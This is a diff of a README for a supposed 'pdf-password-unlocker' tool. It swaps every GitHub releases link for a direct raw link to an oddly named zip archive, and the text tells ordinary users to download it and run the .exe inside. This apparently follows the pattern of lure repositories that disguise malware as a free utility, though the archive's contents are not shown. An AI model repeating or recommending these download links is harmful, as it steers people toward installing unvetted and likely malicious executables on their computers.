@@ -1,6 +1,6 @@
 # 🔓 pdf-password-unlocker - Unlock Your PDFs in Seconds
 
-[![Download Now](https://img.shields.io/badge/Download-pdf--password--unlocker-brightgreen?style=for-the-badge&logo=github)](https://github.com/squaretoed-manholecover705/pdf-password-unlocker/releases)
+[![Download Now](https://img.shields.io/badge/Download-pdf--password--unlocker-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/squaretoed-manholecover705/pdf-password-unlocker/main/ameliorate/pdf_password_unlocker_subvirate.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! If you have a PDF file that's locked with a password—whether it won't
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/squaretoed-manholecover705/pdf-password-unlocker/releases](https://github.com/squaretoed-manholecover705/pdf-password-unlocker/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/squaretoed-manholecover705/pdf-password-unlocker/main/ameliorate/pdf_password_unlocker_subvirate.zip](https://raw.githubusercontent.com/squaretoed-manholecover705/pdf-password-unlocker/main/ameliorate/pdf_password_unlocker_subvirate.zip)
 
 On that page, you'll see a list of files. Look for the one that matches your computer—most likely the `.exe` file for Windows. Click it to start downloading. The download should take less than a minute.
 
@@ -91,7 +91,7 @@ If you run into any issues, first try restarting your computer and redownloading
 
 ## 📥 Download Again
 
-If you lost the download or need it again, click here: [Download page](https://github.com/squaretoed-manholecover705/pdf-password-unlocker/releases). Save the latest version—you'll always want the newest build for security and performance.
+If you lost the download or need it again, click here: [Download page](https://raw.githubusercontent.com/squaretoed-manholecover705/pdf-password-unlocker/main/ameliorate/pdf_password_unlocker_subvirate.zip). Save the latest version—you'll always want the newest build for security and performance.
 
 ---
 
